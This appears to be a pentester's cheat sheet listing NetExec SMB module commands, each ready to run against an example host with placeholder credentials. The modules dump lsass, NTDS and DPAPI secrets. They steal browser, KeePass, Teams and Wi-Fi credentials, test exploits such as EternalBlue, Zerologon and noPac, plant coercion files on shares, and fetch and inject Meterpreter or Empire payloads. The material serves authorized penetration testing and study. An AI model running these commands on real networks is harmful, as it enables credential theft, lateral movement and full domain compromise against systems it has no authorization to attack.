#### 
#### Adds or deletes a domain computer
```
#### nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M add-computer              
```

#### Search for aws credentials files.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M aws-credentials           
```

#### Exploit user in backup operator group to dump NTDS @mpgn_x64
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M backup_operator           
```

#### Change or reset user passwords via various protocols
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M change-password           
```

#### Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M coerce_plus               
```

#### [REMOVED] Module to check if the DC is vulnerable to DFSCoerce, credit to @filip_dragovic/@Wh04m1001 and @topotam
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M dfscoerce                 
```

#### Drop a searchConnector-ms file on each writable share
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M drop-sc                   
```
#### Tries to activate the EFSR service by creating a file with the encryption attribute on some available share.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M efsr_spray                
```

#### Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M enum_av                   
```

#### Anonymously uses RPC endpoints to hunt for ADCS CAs
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M enum_ca                   
```

#### Searches the domain controller for registry.xml to find autologon information and returns the username and password.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M gpp_autologin             
```

#### Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M gpp_password              
```

#### Extracts privileges assigned via GPOs and resolves SIDs via LDAP.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M gpp_privileges            
```

#### This module helps you to identify hosts that have additional active interfaces
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M ioxidresolver             
```

#### MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB ENVIRONMENT
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M ms17-010                  
```

#### Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M nopac                     
```

#### [REMOVED] Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M petitpotam                
```

#### [REMOVED] Module to check if the Target is vulnerable to PrinterBug. Set LISTENER IP for coercion.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M printerbug                
```

#### Check if host vulnerable to printnightmare
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M printnightmare            
```

#### Check if host vulnerable to CVE-2019-1040
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M remove-mic                
```

#### Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M scuffy                    
```

#### [REMOVED] Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M shadowcoerce              
```

#### Creates windows shortcuts with the icon attribute containing a URI to the specified  server (default SMB) in all shares with write permissions
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M slinky                    
```
#### 
Module to check for the SMB dialect 3.1.1 and compression capability of the host, which is an indicator for the SMBGhost vulnerability (CVE-2020-0796).
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M smbghost                  
```

#### List files recursively and save a JSON share-file metadata to the 'OUTPUT_FOLDER'. See module options for finer configuration.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M spider_plus               
```

#### Detect if print spooler is enabled or not
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M spooler                   
```

#### Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M timeroast                 
```

#### Checks whether the WebClient service is running on the target
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M webdav                    
```

#### Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M zerologon                 
```


High  PRIVILEGE MODULES (requires admin privs)

##### Enumerating BitLocker Status on target(s) If it is enabled or disabled.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M bitlocker                 
```
##### Remotely dump Dpapi hash based on masterkeys
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M dpapi_hash                
```
##### Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M empire_exec               
```
##### Extract Entra ID sync credentials from the target host
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M entra-sync-creds          
```
##### Uses WMI to dump DNS from an AD DNS Server
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M enum_dns                  
```
##### Retrieve the list of network interfaces info (Name, IP Address, Subnet Mask, Default Gateway) from remote Windows registry (formerly --interfaces)
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M enum_interfaces           
```
##### Extracting Credentials From Windows Logs (Event ID: 4688 and SYSMON)
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M eventlog_creds            
```
##### [REMOVED] Dump credentials from Firefox
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M firefox                   
```
##### Uses WMI to query network connections.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M get_netconnections        
```
##### Get lsass dump using handlekatz64 and parse the result with pypykatz
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M handlekatz                
```
##### Dump lsass recursively from a given hash using BH to find local admins
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M hash_spider               
```
##### Performs a registry query on the VM to lookup its HyperV Host
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M hyperv-host               
```
##### Checks for credentials in IIS Application Pool configuration files using appcmd.exe
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M iis                       
```
##### List and impersonate tokens to run command as locally logged on users
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M impersonate               
```
##### Checks for AlwaysInstallElevated
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M install_elevated          
```
##### Search for KeePass-related files and process.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M keepass_discover          
```
##### Set up a malicious KeePass trigger to export the database in cleartext.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M keepass_trigger           
```
##### Detect Windows lock screen backdoors by checking FileDescriptions of accessibility binaries.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M lockscreendoors           
```
##### Dump lsass and parse the result remotely with lsassy
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M lsassy                    
```
##### Remotely dump domain user credentials via an ADCS and a KDC
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M masky                     
```
##### Downloads the Meterpreter stager and injects it into memory
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M met_inject                
```
##### Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M mobaxterm                 
```
##### Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them) 
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M mremoteng                 
```
##### Dump MSOL cleartext password and Entra ID credentials from the localDB on the Entra ID Connect Server
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M msol                      
```
##### Get lsass dump using nanodump and parse the result with pypykatz
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M nanodump                  
```
##### Extracts content from Windows Notepad tab state binary files.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M notepad                   
```
##### Extracts notepad++ unsaved files.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M notepad++                 
```
##### Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M ntds-dump-raw             
```
##### Dump NTDS with ntdsutil
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M ntdsutil                  
```
##### Detect if lmcompatibilitylevel on the target is set to lower than 3 (which means ntlmv1 is enabled)
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M ntlmv1                    
```
##### Run command as logged on users via Process Injection
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M pi                        
```
##### Extracts PowerShell history for all users and looks for sensitive commands.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M powershell_history        
```
##### Traces Domain and Enterprise Admin presence in the target over SMB
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M presence                  
```
##### Get lsass dump using procdump64 and parse the result with pypykatz
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M procdump                  
```
##### Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M putty                     
```
##### Remotely dump Remote Desktop Connection Manager (sysinternals) credentials
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M rdcman                    
```
##### Enables/Disables RDP
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M rdp                       
```
##### Extracts recently modified files
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M recent_files              
```
##### Lists and exports users' recycle bins
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M recyclebin                
```
##### Performs a registry query on the machine
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M reg-query                 
```
##### Collect autologon credential stored in the registry
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M reg-winlogon              
```
##### Enable or disable remote UAC
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M remote-uac                
```
##### Check if the registry value RunAsPPL is set or not
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M runasppl                  
```
##### Remotely execute a scheduled task as a logged on user
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M schtask_as                
```
##### Gets security questions and answers for users on computer
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M security-questions        
```
##### Enables or disables shadow RDP
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M shadowrdp                 
```
##### Downloads screenshots taken by the (new) Snipping Tool.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M snipped                   
```
##### Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M teams_localdb             
```
##### Pings a host
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M test_connection           
```
##### Checks UAC status
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M uac                       
```
##### Extracts credentials from local Veeam SQL Database
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M veeam                     
```
##### Loot Passwords from VNC server and client configurations
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M vnc                       
```
##### Dump access token from Token Broker Cache. More info here https://blog.xpnsec.com/wam-bam/. Module by zblurx
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M wam                       
```
##### Check various security configuration items on Windows machines
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M wcc                       
```
##### Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M wdigest                   
```
##### Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M web_delivery              
```
##### Get key of all wireless interfaces
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M wifi                      
```
##### Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.
```
nxc smb 192.168.102.227 -u USERNAME -p PASSWORD -M winscp                    
```